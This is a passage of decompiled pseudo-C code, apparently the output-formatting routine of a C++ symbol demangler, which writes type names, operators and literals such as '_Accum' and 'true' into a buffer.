(ppiVar10 == NULL) {\ncode_r0x00407ec5:\n                    *(arg1 + 0x130) = 1;\n                    return ppiVar10;\n                }\n                uVar7 = *ppiVar10;\n                if (uVar7 == 0x2f) {\n                    iVar28 = *(arg1 + 0x134);\n                    while (0 < iVar28) {\n                        ppiVar10 = ppiVar10[2];\n                        iVar28 = iVar28 + -1;\n                        if ((ppiVar10 == NULL) || (*ppiVar10 != 0x2f)) goto code_r0x00407ec5;\n                    }\n                    if ((iVar28 == 0) && (ppiVar10 = ppiVar10[1],  ppiVar10 != NULL)) {\n                        uVar7 = *ppiVar10;\n                        goto code_r0x0040624f;\n                    }\n                    goto code_r0x00407ec5;\n                }\n            }\ncode_r0x0040624f:\n            if ((uVar7 == 0x23) || (*arg3 == uVar7)) {\n                appiStack200[0] = *(arg1 + 0x128);\n                arg3 = ppiVar10;\n                goto code_r0x004047d7;\n            }\n            if (uVar7 != 0x24) goto code_r0x004047d0;\n            piVar24 = ppiVar10[1];\n            appiStack200[0] = *(arg1 + 0x128);\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            apiStack184[1] = *(arg1 + 0x120);\n            appiStack200[1] = arg3;\n            if (piVar24 == NULL) goto code_r0x00404801;\n            goto code_r0x00404805;\n        case 0x27:\n            appiStack200[0] = arg3[1];\n            if ((arg2 & 4) == 0) {\n                iVar28 = *(appiStack200[0] + 1);\n                piVar24 = *appiStack200[0];\n                if (iVar28 != 0) {\n                    ppiVar10 = *(arg1 + 0x100);\n                    iVar13 = 1;\n                    do {\n                        uVar30 = *(piVar24 + iVar13 + -1);\n                        if (ppiVar10 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            appiStack200[0] = NULL;\n                            ppiVar10 = 0x1;\n                        }\n                        else {\n                            appiStack200[0] = ppiVar10;\n                            ppiVar10 = ppiVar10 + 1;\n                        }\n                        iVar13 = iVar13 + 1;\n                        *(arg1 + 0x100) = ppiVar10;\n                        arg1[appiStack200[0]] = uVar30;\n                        arg1[0x108] = uVar30;\n                    } while (iVar13 != iVar28 + 1);\n                }\n            }\n            else {\n                iVar28 = *(appiStack200[0] + 3);\n                piVar24 = appiStack200[0][2];\n                if (iVar28 != 0) {\n                    ppiVar10 = *(arg1 + 0x100);\n                    iVar13 = 1;\n                    do {\n                        uVar30 = *(piVar24 + iVar13 + -1);\n                        if (ppiVar10 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            appiStack200[0] = NULL;\n                            ppiVar10 = 0x1;\n                        }\n                        else {\n                            appiStack200[0] = ppiVar10;\n                            ppiVar10 = ppiVar10 + 1;\n                        }\n                        iVar13 = iVar13 + 1;\n                        *(arg1 + 0x100) = ppiVar10;\n                        arg1[appiStack200[0]] = uVar30;\n                        arg1[0x108] = uVar30;\n                    } while (iVar13 != iVar28 + 1);\n                }\n            }\n            break;\n        case 0x28:\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x29:\n            if ((arg2 & 0x20) == 0) {\n                appiStack200[0] = ppiVar9;\n                if ((arg3[1] != NULL) && ((arg2 & 0x40) == 0)) {\n                    appiStack200[0] = *(arg1 + 0x128);\n                    apiStack184[0]._0_4_ = 0;\n                    *(arg1 + 0x128) = &stack0xffffffffffffff38;\n                    apiStack184[1] = *(arg1 + 0x120);\n                    appiStack200[1] = arg3;\n                    fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n                    *(arg1 + 0x128) = appiStack200[0];\n                    if (apiStack184[0] != 0) {\n                        return appiStack200[0];\n                    }\n                    fcn.00401cf0(arg1, 0x20);\n                }\n                appiStack200[0] = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n            }\n            else {\n                appiStack200[0] = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n                if (arg3[1] != NULL) {\n                    appiStack200[0] = fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n                }\n            }\n            break;\n        case 0x2a:\n            ppiVar10 = *(arg1 + 0x128);\n            apiStack184[1] = *(arg1 + 0x120);\n            apiStack184[0]._0_4_ = 0;\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            appiStack200[0] = ppiVar10;\n            if ((ppiVar10 == NULL) || (2 < *ppiVar10[1] - 0x19U)) {\n                appiStack200[1] = arg3;\n                ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                *(arg1 + 0x128) = ppiVar10;\n                if (apiStack184[0] != 0) {\n                    return ppiVar9;\n                }\n            }\n            else {\n                uVar7 = 1;\n                ppiVar9 = ppiVar10;\n                puVar20 = &stack0xffffffffffffff38;\n                do {\n                    if (*(ppiVar9 + 2) == 0) {\n                        if (3 < uVar7) {\n                            *(arg1 + 0x130) = 1;\n                            return ppiVar9;\n                        }\n                        uVar11 = uVar7;\n                        uVar7 = uVar7 + 1;\n                        iVar13 = uVar11 * 0x20;\n                        *(&stack0xffffffffffffff38 + iVar13) = *ppiVar9;\n                        *(&stack0xffffffffffffff40 + iVar13) = ppiVar9[1];\n                        *(&stack0xffffffffffffff48 + iVar13) = ppiVar9[2];\n                        piVar24 = ppiVar9[3];\n                        *(&stack0xffffffffffffff38 + iVar13) = puVar20;\n                        puVar20 = &stack0xffffffffffffff38 + uVar11 * 0x20;\n                        *(&stack0xffffffffffffff50 + iVar13) = piVar24;\n                        *(arg1 + 0x128) = puVar20;\n                        *(ppiVar9 + 2) = 1;\n                    }\n                    ppiVar9 = *ppiVar9;\n                } while ((ppiVar9 != NULL) && (*ppiVar9[1] - 0x19U < 3));\n                appiStack200[1] = arg3;\n                ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                *(arg1 + 0x128) = ppiVar10;\n                if (apiStack184[0] != 0) {\n                    return ppiVar9;\n                }\n                if (uVar7 != 1) {\n                    do {\n                        uVar7 = uVar7 - 1;\n                        fcn.00407fc0(arg1, arg2_00, *(&stack0xffffffffffffff40 + uVar7 * 0x20));\n                    } while (uVar7 != 1);\n                    ppiVar10 = *(arg1 + 0x128);\n                }\n            }\n            appiStack200[0] = fcn.00408b60(arg1, arg2_00, arg3 + 1, ppiVar10);\n            break;\n        case 0x2b:\n        case 0x2d:\n            appiStack200[0] = *(arg1 + 0x128);\n            apiStack184[0]._0_4_ = 0;\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            apiStack184[1] = *(arg1 + 0x120);\n            appiStack200[1] = arg3;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            if (apiStack184[0] == 0) {\n                fcn.00407fc0(arg1, arg2_00, arg3);\n            }\n            *(arg1 + 0x128) = appiStack200[0];\n            break;\n        case 0x2c:\n            if (*(arg3 + 0x12) != 0) {\n                iVar13 = *(arg1 + 0x100);\n                pcVar19 = \"_Sat \";\n                do {\n                    cVar25 = *pcVar19;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n            }\n            if (*(arg3[1] + 2) == 0x42ea20) {\n                ppiVar10 = *(arg1 + 0x100);\n            }\n            else {\n                fcn.00407f90(arg1, arg2_00, arg3[1]);\n                iVar13 = *(arg1 + 0x100);\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar10 = 0x1;\n                    iVar13 = 0;\n                }\n                else {\n                    ppiVar10 = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[iVar13] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            if (*(arg3 + 2) == 0) {\n                pcVar19 = \"_Fract\";\n                do {\n                    cVar25 = *pcVar19;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n            }\n            else {\n                pcVar19 = \"_Accum\";\n                do {\n                    cVar25 = *pcVar19;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n            }\n            break;\n        case 0x2e:\n        case 0x2f:\n            if (arg3[1] != NULL) {\n                appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            }\n            if (arg3[2] != NULL) {\n                uVar11 = *(arg1 + 0x100);\n                if (0xfd < uVar11) {\n                    arg1[uVar11] = 0;\n                    (**(arg1 + 0x110))(arg1, uVar11, *(arg1 + 0x118));\n                    *(arg1 + 0x100) = 0;\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    uVar11 = 0;\n                }\n                puVar20 = 0x42da68;\n                do {\n                    uVar30 = *puVar20;\n                    if (uVar11 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        uVar12 = 0;\n                        uVar11 = 1;\n                    }\n                    else {\n                        uVar12 = uVar11;\n                        uVar11 = uVar11 + 1;\n                    }\n                    puVar20 = puVar20 + 1;\n                    *(arg1 + 0x100) = uVar11;\n                    arg1[uVar12] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar20 != 0x42da6a);\n                iVar28 = *(arg1 + 0x138);\n                appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                if ((iVar28 == *(arg1 + 0x138)) && (*(arg1 + 0x100) == uVar11)) {\n                    *(arg1 + 0x100) = uVar11 - 2;\n                }\n            }\n            break;\n        case 0x30:\n            piVar24 = arg3[2];\n            if (arg3[1] != NULL) {\n                fcn.00407f90(arg1, arg2_00, arg3[1]);\n            }\n            iVar13 = *(arg1 + 0x100);\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar13 = 0;\n            }\n            else {\n                iVar14 = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar13] = 0x7b;\n            arg1[0x108] = 0x7b;\n            fcn.00407f90(arg1, arg2_00, piVar24);\n            appiStack200[0] = *(arg1 + 0x100);\n            if (appiStack200[0] == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                appiStack200[0] = NULL;\n            }\n            else {\n                iVar13 = appiStack200[0] + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[appiStack200[0]] = 0x7d;\n            arg1[0x108] = 0x7d;\n            break;\n        case 0x31:\n            piVar24 = arg3[1];\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"operator\";\n            iVar28 = piVar24[4];\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            puVar21 = *(piVar24 + 2);\n            appiStack200[0] = *puVar21 - 0x61;\n            if (*puVar21 - 0x61 < 0x1a) {\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    appiStack200[0] = 0x1;\n                    iVar13 = 0;\n                }\n                else {\n                    appiStack200[0] = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = appiStack200[0];\n                arg1[iVar13] = 0x20;\n                arg1[0x108] = 0x20;\n                puVar21 = *(piVar24 + 2);\n            }\n            iVar13 = iVar28;\n            if (puVar21[iVar13 + -1] == 0x20) {\n                iVar13 = iVar28 + -1;\n            }\n            if (iVar13 != 0) {\n                ppiVar10 = *(arg1 + 0x100);\n                puVar15 = puVar21 + iVar13;\n                do {\n                    uVar1 = *puVar21;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    puVar21 = puVar21 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = uVar1;\n                    arg1[0x108] = uVar1;\n                } while (puVar21 != puVar15);\n            }\n            break;\n        case 0x32:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"operator \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            break;\n        case 0x33:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"operator \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.004090e0(arg1, arg2_00, arg3 + 1);\n            break;\n        case 0x34:\n            appiStack200[0] = fcn.00409360(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x35:\n            piVar24 = arg3[1];\n            piVar18 = arg3[2];\n            bVar31 = *piVar24 == 0x31;\n            if (bVar31) {\n                iVar13 = 3;\n                pcVar19 = **(piVar24 + 2);\n                pcVar23 = pcVar19;\n                pcVar27 = 0x42da7e;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    bVar31 = *pcVar23 == *pcVar27;\n                    pcVar23 = pcVar23 + 1;\n                    pcVar27 = pcVar27 + 1;\n                } while (bVar31);\n                if ((bVar31) && (*piVar18 == 3)) {\n                    if ((**(piVar18 + 2) == 1) && (**(piVar18 + 4) == 0x29)) {\n                        piVar18 = *(piVar18 + 2);\n                    }\n                }\n                else if (*piVar18 == 0x37) {\n                    fcn.00409420(arg1, arg2_00, *(piVar18 + 2));\n                    ppiVar10 = fcn.00409360(arg1, arg2_00, piVar24);\n                    return ppiVar10;\n                }\n                fcn.00409360(arg1, arg2_00, piVar24);\n                bVar31 = pcVar19 == NULL;\n                if (!bVar31) {\n                    iVar13 = 3;\n                    pcVar23 = pcVar19;\n                    pcVar27 = 0x42da81;\n                    do {\n                        if (iVar13 == 0) break;\n                        iVar13 = iVar13 + -1;\n                        bVar31 = *pcVar23 == *pcVar27;\n                        pcVar23 = pcVar23 + 1;\n                        pcVar27 = pcVar27 + 1;\n                    } while (bVar31);\n                    if (bVar31) {\n                        ppiVar10 = fcn.00407f90(arg1, arg2_00, piVar18);\n                        return ppiVar10;\n                    }\n                    iVar13 = 3;\n                    pcVar23 = 0x42d8bf;\n                    do {\n                        if (iVar13 == 0) break;\n                        iVar13 = iVar13 + -1;\n                        bVar31 = *pcVar19 == *pcVar23;\n                        pcVar19 = pcVar19 + 1;\n                        pcVar23 = pcVar23 + 1;\n                    } while (bVar31);\n                    if (bVar31) {\n                        iVar13 = *(arg1 + 0x100);\n                        if (iVar13 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            iVar13 = 0;\n                        }\n                        *(arg1 + 0x100) = iVar13 + 1;\n                        arg1[iVar13] = 0x28;\n                        arg1[0x108] = 0x28;\n                        fcn.00407f90(arg1, arg2_00, piVar18);\n                        ppiVar10 = *(arg1 + 0x100);\n                        if (ppiVar10 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            ppiVar10 = NULL;\n                        }\n                        *(arg1 + 0x100) = ppiVar10 + 1;\n                        arg1[ppiVar10] = 0x29;\n                        arg1[0x108] = 0x29;\n                        return ppiVar10;\n                    }\n                }\n            }\n            else if (*piVar24 == 0x33) {\n                iVar13 = *(arg1 + 0x100);\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 1;\n                    iVar13 = 0;\n                }\n                else {\n                    iVar14 = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = iVar14;\n                arg1[iVar13] = 0x28;\n                arg1[0x108] = 0x28;\n                fcn.004090e0(arg1, arg2_00, piVar24 + 2);\n                iVar13 = *(arg1 + 0x100);\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 1;\n                    iVar13 = 0;\n                }\n                else {\n                    iVar14 = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = iVar14;\n                arg1[iVar13] = 0x29;\n                arg1[0x108] = 0x29;\n            }\n            else {\n                fcn.00409360(arg1, arg2_00, piVar24);\n            }\n            appiStack200[0] = fcn.00409420(arg1, arg2_00, piVar18);\n            break;\n        case 0x36:\n            appiStack200[0] = arg3[2];\n            if (*appiStack200[0] == 0x37) {\n                puVar22 = arg3[1];\n                ppuVar5 = *(puVar22 + 2);\n                puVar21 = *ppuVar5;\n                if ((puVar21[1] == 99) && ((*puVar21 + 0x9d < 2 || (*puVar21 + 0x8e < 2)))) {\n                    fcn.00409360(arg1, arg2_00, puVar22);\n                    fcn.00401cf0(arg1, 0x3c);\n                    fcn.00407f90(arg1, arg2_00, *(arg3[2] + 2));\n                    fcn.004046f0(arg1, 0x42db2e);\n                    fcn.00407f90(arg1, arg2_00, *(arg3[2] + 4));\n                    ppiVar10 = fcn.00401cf0(arg1, 0x29);\n                    return ppiVar10;\n                }\n                uVar30 = *puVar22 < 0x31;\n                uVar32 = *puVar22 == 0x31;\n                if (uVar32) {\n                    uVar30 = *(ppuVar5 + 2) == 0;\n                    uVar32 = *(ppuVar5 + 2) == 1;\n                    if (uVar32) {\n                        uVar30 = *ppuVar5[1] < 0x3e;\n                        uVar32 = *ppuVar5[1] == 0x3e;\n                        if (uVar32) {\n                            fcn.00401cf0(arg1, 0x28);\n                            puVar21 = **(arg3[1] + 2);\n                            appiStack200[0] = arg3[2];\n                        }\n                    }\n                }\n                iVar13 = 3;\n                piVar24 = appiStack200[0][1];\n                puVar15 = 0x42d8c2;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    uVar30 = *puVar21 < *puVar15;\n                    uVar32 = *puVar21 == *puVar15;\n                    puVar21 = puVar21 + 1;\n                    puVar15 = puVar15 + 1;\n                } while (uVar32);\n                uVar30 = (!uVar30 && !uVar32) == uVar30;\n                if ((uVar30) && (uVar30 = *piVar24 == 3,  uVar30)) {\n                    uVar30 = **(piVar24 + 4) == 0x29;\n                    if (!uVar30) {\n                        *(arg1 + 0x130) = 1;\n                    }\n                    fcn.00409420(arg1, arg2_00, *(piVar24 + 2));\n                }\n                else {\n                    fcn.00409420(arg1, arg2_00, piVar24);\n                }\n                iVar13 = 3;\n                pcVar19 = **(arg3[1] + 2);\n                pcVar23 = pcVar19;\n                pcVar27 = 0x42da84;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    uVar30 = *pcVar23 == *pcVar27;\n                    pcVar23 = pcVar23 + 1;\n                    pcVar27 = pcVar27 + 1;\n                } while (uVar30);\n                if (uVar30) {\n                    fcn.00401cf0(arg1, 0x5b);\n                    fcn.00407f90(arg1, arg2_00, *(arg3[2] + 4));\n                    fcn.00401cf0(arg1, 0x5d);\n                }\n                else {\n                    iVar13 = 3;\n                    pcVar23 = 0x42d8c2;\n                    do {\n                        if (iVar13 == 0) break;\n                        iVar13 = iVar13 + -1;\n                        uVar30 = *pcVar19 == *pcVar23;\n                        pcVar19 = pcVar19 + 1;\n                        pcVar23 = pcVar23 + 1;\n                    } while (uVar30);\n                    if (!uVar30) {\n                        fcn.00409360(arg1, arg2_00, arg3[1]);\n                    }\n                    fcn.00409420(arg1, arg2_00, *(arg3[2] + 4));\n                }\n                ppiVar10 = arg3[1];\n                if (*ppiVar10 != 0x31) {\n                    return ppiVar10;\n                }\n                ppiVar10 = ppiVar10[1];\n                if (*(ppiVar10 + 2) != 1) {\n                    return ppiVar10;\n                }\n                if (*ppiVar10[1] != '>') {\n                    return ppiVar10[1];\n                }\n                ppiVar10 = fcn.00401cf0(arg1, 0x29);\n                return ppiVar10;\n            }\n            goto code_r0x0040562d;\n        case 0x37:\n            *(arg1 + 0x130) = 1;\n            break;\n        case 0x38:\n            appiStack200[0] = arg3[2];\n            if (*appiStack200[0] == 0x39) {\n                piVar24 = appiStack200[0][2];\n                bVar31 = *piVar24 == 0x3a;\n                if (bVar31) {\n                    piVar18 = arg3[1];\n                    piVar29 = appiStack200[0][1];\n                    iVar14 = 3;\n                    uVar4 = *(piVar24 + 2);\n                    iVar13 = *(piVar24 + 4);\n                    pcVar19 = **(piVar18 + 2);\n                    pcVar23 = 0x42d8cb;\n                    do {\n                        if (iVar14 == 0) break;\n                        iVar14 = iVar14 + -1;\n                        bVar31 = *pcVar19 == *pcVar23;\n                        pcVar19 = pcVar19 + 1;\n                        pcVar23 = pcVar23 + 1;\n                    } while (bVar31);\n                    if (bVar31) {\n                        fcn.00409420(arg1, arg2_00, piVar29);\n                        fcn.00409360(arg1, arg2_00, piVar18);\n                        fcn.00409420(arg1, arg2_00, uVar4);\n                        fcn.004046f0(arg1, 0x42da87);\n                        ppiVar10 = fcn.00409420(arg1, arg2_00, iVar13);\n                        return ppiVar10;\n                    }\n                    fcn.004046f0(arg1, \"new \");\n                    if (*(piVar29 + 2) != 0) {\n                        fcn.00409420(arg1, arg2_00, piVar29);\n                        fcn.00401cf0(arg1, 0x20);\n                    }\n                    ppiVar10 = fcn.00407f90(arg1, arg2_00, uVar4);\n                    if (iVar13 == 0) {\n                        return ppiVar10;\n                    }\n                    ppiVar10 = fcn.00409420(arg1, arg2_00, iVar13);\n                    return ppiVar10;\n                }\n            }\ncode_r0x0040562d:\n            *(arg1 + 0x130) = 1;\n            break;\n        case 0x39:\n        case 0x3a:\n            *(arg1 + 0x130) = 1;\n            break;\n        case 0x3b:\n        case 0x3c:\n            uVar6 = 0;\n            if (*arg3[1] == 0x27) {\n                uVar6 = *(*(arg3[1] + 2) + 0x1c);\n                if (uVar6 != 0) {\n                    if (uVar6 < 7) {\n                        piVar24 = arg3[2];\n                        if (*piVar24 == 0) {\n                            if (uVar7 == 0x3c) {\n                                fcn.00401cf0(arg1, 0x2d);\n                                piVar24 = arg3[2];\n                            }\n                            fcn.00407f90(arg1, arg2_00, piVar24);\n                            switch(uVar6) {\n                            default:\n                                return *(uVar6 * 4 + 0x42dc64) + 0x42dc64;\n                            case 2:\n                                ppiVar10 = fcn.00401cf0(arg1, 0x75);\n                                return ppiVar10;\n                            case 3:\n                                ppiVar10 = fcn.00401cf0(arg1, 0x6c);\n                                return ppiVar10;\n                            case 4:\n                                ppiVar10 = fcn.004046f0(arg1, 0x42da90);\n                                return ppiVar10;\n                            case 5:\n                                ppiVar10 = fcn.004046f0(arg1, 0x42da93);\n                                return ppiVar10;\n                            case 6:\n                                ppiVar10 = fcn.004046f0(arg1, 0x42da96);\n                                return ppiVar10;\n                            }\n                        }\n                    }\n                    else if ((((uVar6 == 7) && (piVar24 = arg3[2],  *piVar24 == 0)) && (piVar24[4] == 1)) &&\n                            (uVar7 == 0x3b)) {\n                        if (**(piVar24 + 2) == '0') {\n                            ppiVar10 = fcn.004046f0(arg1, \"false\");\n                            return ppiVar10;\n                        }\n                        if (**(piVar24 + 2) == '1') {\n                            ppiVar10 = fcn.004046f0(arg1, \"true\");\n                            return ppiVar10;\n                        }\n                    }\n                }\n            }\n            iVar13 = *(arg1 + 0x100);\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar13 = 0;\n            }\n            else {\n                iVar14 = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar13] = 0x28;\n            arg1[0x108] = 0x28;\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                *arg1 = 0x29;\n                arg1[0x108] = 0x29;\n                uVar7 = *arg3;\n                *(arg1 + 0x100) = 1;\n                if (uVar7 == 0x3c) {\n                    iVar14 = 1;\n                    goto code_r0x004076d6;\n                }\n            }\n            else {\n                iVar14 = iVar13 + 1;\n                *(arg1 + 0x100) = iVar14;\n                arg1[iVar13] = 0x29;\n                arg1[0x108] = 0x29;\n                if (*arg3 == 0x3c) {\n                    if (iVar14 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                    }\ncode_r0x004076d6:\n                    *(arg1 + 0x100) = iVar14 + 1;\n                    arg1[iVar14] = 0x2d;\n                    arg1[0x108] = 0x2d;\n                }\n            }\n            if (uVar6 == 8) {\n                iVar13 = *(arg1 + 0x100);\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar13 = 0;\n                }\n                *(arg1 + 0x100) = iVar13 + 1;\n                arg1[iVar13] = 0x5b;\n                arg1[0x108] = 0x5b;\n                fcn.00407f90(arg1, arg2_00, arg3[2]);\n                appiStack200[0] = *(arg1 + 0x100);\n                if (appiStack200[0] == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    appiStack200[0] = NULL;\n                }\n                *(arg1 + 0x100) = appiStack200[0] + 1;\n                arg1[appiStack200[0]] = 0x5d;\n                arg1[0x108] = 0x5d;\n            }\n            else {\n                appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            }\n            break;\n        case 0x3d:\n            iVar13 = *(arg1 + 